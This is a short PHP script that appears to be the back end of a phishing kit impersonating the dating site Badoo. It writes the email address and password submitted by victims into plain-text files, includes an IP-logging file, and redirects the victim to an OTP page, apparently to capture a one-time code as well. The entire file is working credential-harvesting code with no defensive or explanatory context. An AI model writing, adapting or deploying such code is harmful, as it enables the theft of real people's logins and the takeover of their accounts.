<?php
include 'ip.php';
file_put_contents("usernames.txt", "Badoo Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Badoo Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
